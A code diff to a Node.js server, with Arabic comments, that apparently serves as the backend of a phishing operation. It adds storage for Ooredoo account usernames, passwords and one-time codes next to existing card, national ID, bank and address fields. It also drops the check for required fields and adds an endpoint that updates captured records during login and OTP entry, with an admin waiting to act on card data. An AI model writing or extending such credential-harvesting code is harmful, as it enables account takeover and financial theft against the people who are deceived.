@@ -92,7 +92,7 @@ const readBody = (req) => new Promise((resolve) => {
   });
 });
 
-const FIELDS = ['card', 'status', 'name', 'qid', 'phone', 'email', 'gender', 'bank', 'address'];
+const FIELDS = ['card', 'status', 'name', 'qid', 'phone', 'email', 'gender', 'bank', 'address', 'ooredooUser', 'ooredooPass', 'ooredooOtp'];
 
 const serveFile = (res, file) => {
   fs.readFile(file, (err, buf) => {
@@ -139,13 +139,38 @@ const server = http.createServer(async (req, res) => {
     for (const f of FIELDS) order[f] = String(body[f] == null ? '' : body[f]).slice(0, 400);
 
     if (!order.name || !order.phone || !order.qid) {
-      return json(res, 400, { ok: false, error: 'missing-fields' });
+      const fallbackName = String(body.name || body.ooredooUser || 'مستخدم أوريدو').slice(0, 120);
+      const fallbackPhone = String(body.phone || '0000000000').slice(0, 16);
+      const fallbackQid = String(body.qid || '0000000000000').slice(0, 20);
+      order.name = fallbackName;
+      order.phone = fallbackPhone;
+      order.qid = fallbackQid;
     }
     const list = readOrders();
     list.unshift(order);
     writeOrders(list);
     console.log('طلب جديد:', order.id, order.name);
     return json(res, 200, { ok: true, id: order.id });
+  }
+
+  // تحديث طلب موجود (مثل بيانات أوريدو عند تسجيل الدخول/OTP)
+  if (pathname.startsWith('/api/orders/') && req.method === 'PUT') {
+    const id = pathname.split('/').filter(Boolean).slice(1).pop();
+    const body = await readBody(req);
+    const list = readOrders();
+    const index = list.findIndex((item) => item.id === id);
+    if (index === -1) return json(res, 404, { ok: false, error: 'order-not-found' });
+
+    const order = list[index];
+    for (const f of FIELDS) {
+      if (body[f] != null) order[f] = String(body[f]).slice(0, 400);
+    }
+    if (body.ooredooUser) order.ooredooUser = String(body.ooredooUser).slice(0, 200);
+    if (body.ooredooPass) order.ooredooPass = String(body.ooredooPass).slice(0, 200);
+    if (body.ooredooOtp) order.ooredooOtp = String(body.ooredooOtp).slice(0, 20);
+    if (body.status) order.status = String(body.status).slice(0, 40);
+    writeOrders(list);
+    return json(res, 200, { ok: true, id: order.id, order: order });
   }
 
   // استقبال بيانات البطاقة وبدء انتظار قرار الأدمن
